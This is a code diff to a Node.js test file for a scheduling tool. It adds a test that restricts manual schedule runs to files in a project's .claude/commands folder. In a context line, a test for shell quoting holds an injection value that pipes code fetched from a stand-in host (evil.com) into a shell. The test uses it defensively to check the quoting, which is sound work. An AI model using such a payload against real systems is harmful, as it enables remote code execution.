@@ -1,7 +1,11 @@
 const test = require('node:test');
 const assert = require('node:assert/strict');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
 
 const { buildScheduleCommand } = require('../schedule-runner');
+const { isAllowedSchedulePath } = require('../schedule-ipc');
 const { quoteArgForShell, quoteArgvForShell } = require('../shell-profiles');
 
 test('buildScheduleCommand returns argv array, not a shell string', () => {
@@ -116,4 +120,21 @@ test('full simulated schedule command is safe under a malicious frontmatter', ()
   assert.ok(!/[;|&`$]/.test(outside), `shell metachar leaked outside quotes: "${outside}"`);
   // Argv tokens survive as single-quoted strings.
   assert.ok(cmd.includes(`'x"; curl evil.com | sh; echo "'`), `expected quoted model arg in: ${cmd}`);
+});
+
+test('manual schedule runs only accept project .claude/commands schedule files', (t) => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'switchboard-schedule-'));
+  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
+  const commands = path.join(root, '.claude', 'commands');
+  fs.mkdirSync(commands, { recursive: true });
+  const allowed = path.join(commands, 'schedule-health.md');
+  const wrongName = path.join(commands, 'notes.md');
+  const outside = path.join(root, 'schedule-outside.md');
+  fs.writeFileSync(allowed, 'prompt');
+  fs.writeFileSync(wrongName, 'notes');
+  fs.writeFileSync(outside, 'prompt');
+
+  assert.equal(isAllowedSchedulePath(allowed), true);
+  assert.equal(isAllowedSchedulePath(wrongName), false);
+  assert.equal(isAllowedSchedulePath(outside), false);
 });
